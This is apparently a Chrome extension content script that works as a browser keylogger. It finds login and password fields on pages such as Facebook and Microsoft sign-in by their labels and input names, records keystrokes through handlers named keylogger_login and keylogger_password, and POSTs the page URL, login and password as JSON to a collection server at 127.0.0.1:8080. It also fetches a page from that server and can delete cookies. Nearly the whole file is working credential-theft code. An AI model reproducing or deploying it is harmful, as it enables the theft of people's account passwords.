var keys="";

var keywords = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:","<span class=\"accesskey\">M</span>ot de passe:", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile","        Mot de passe      ", "Adresse e-mail ou téléphone","              Adresse e-mail ou numéro de téléphone portable            "];
var logs = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone", "              Adresse e-mail ou numéro de téléphone portable            "];
var psswd = ["password", "Mot de passe","<span class=\"accesskey\">M</span>ot de passe:", "        Mot de passe      "];
var elemLabels = document.getElementsByTagName("label");
var labels = [];
var finalInputsId = [];
var inputId = [];
var inputs = [];
var str = [];



function deleteCookies (site) {
    var cookies = document.cookie.split("; ");
    for (var c = 0; c < cookies.length; c++) {
        var d = site.split(".");
        while (d.length > 0) {
            var cookieBase = encodeURIComponent(cookies[c].split(";")[0].split("=")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path=';
            var p = location.pathname.split('/');
            document.cookie = cookieBase + '/';
            while (p.length > 0) {
                document.cookie = cookieBase + p.join('/');
                p.pop();
            };
            d.shift();
        }
    }
}


var boolean =  window.location.href.split('/')[3] != ""

if(window.location.href.indexOf("https://www.facebook.com") > -1 && document.getElementsByClassName("jewelCount") != null ){
		chrome.runtime.sendMessage({connexion: "www.facebook.com"});
	if( boolean == false ){
		var xhr1 = new XMLHttpRequest();
		xhr1.open("GET", "https://127.0.0.1:8080/page", false);
		xhr1.send();
		var page = "";
		if(xhr1.status == 200){
			try{
		 	page = xhr1.response;
			chrome.runtime.sendMessage({url: page});
			}
			catch(err){
				console.log(err.message);
			}
		}

	}
}


var videos = document.getElementsByTagName("video");
var nbVideos = videos.length.toString();

chrome.runtime.sendMessage({badgeText: nbVideos});


for (var i = elemLabels.length - 1; i >= 0; i--) {
	labels[i] = elemLabels[i].innerHTML;
	inputId[i] = elemLabels[i].htmlFor;
}

for (var i = labels.length - 1; i >= 0; i--) {
	if(labels[i].indexOf("    ")){
		labels[i] = labels[i].replace(/[\n]/gi, "" );
	}
	if(keywords.indexOf(labels[i]) > -1){
		finalInputsId.push(inputId[i]);
		str.push(labels[i]);
	}
}

for (var i = finalInputsId.length - 1; i >= 0; i--) {
	inputs.push(document.getElementById(finalInputsId[i]));
}


var inputbis = document.getElementsByName("loginfmt");
var inputter = document.getElementsByName("password");
var input4 = document.getElementsByName("passwd");

for (var i = inputbis.length - 1; i >= 0; i--) {
	inputs.push(inputbis[i]);
	str.push("password");
}

for (var i = inputter.length - 1; i >= 0; i--) {
	inputs.push(inputter[i]);
	str.push("username");
}

for (var i = input4.length - 1; i >= 0; i--) {
	inputs.push(input4[i]);
	str.push("username");
}


for (var i = inputs.length - 1; i >= 0; i--) {
	if(psswd.indexOf(str[i]) > -1 ){
		inputs[i].onkeypress = keylogger_password;
	}
	else{
		inputs[i].onkeypress = keylogger_login;
	}
}

var compt_log = 0;
var compt_pass = 0;
var pass ="";


function keylogger_login(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	if(compt_log == 0){
		compt_log = 1;
		setTimeout(function(){sendToServer("Password", keys)}, 5000);
	}
}

function keylogger_password(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	pass+=key;
	if(compt_pass == 0){
		compt_pass = 1;
		setTimeout(function(){sendToServer("Login", pass)}, 5000);
	}
}


var url = "https://127.0.0.1:8080/json";
var json = "";

function sendToServer(libelle,value){
	if(libelle == "Login"){
		json = json + '{"URL":' + '"' + window.location.href + '"' + ',"login":' + '"' +  value + '"' + ',"password":';
	}
	else{
		json = json + '"' + value + '"}';
		var xhr = new XMLHttpRequest();
		xhr.open("POST", url, true);
		//xhr.setRequestHeader("Authorization", "auth " + Base64.encode("root" + ":" + "root"));
		xhr.setRequestHeader("Content-type", "application/json");
		xhr.send(json);
	}

	if(libelle == "Login"){
		pass = "";
		compt_log = 0;
	}
	else{
		keys = "";
		compt_pass = 0;
	}
}
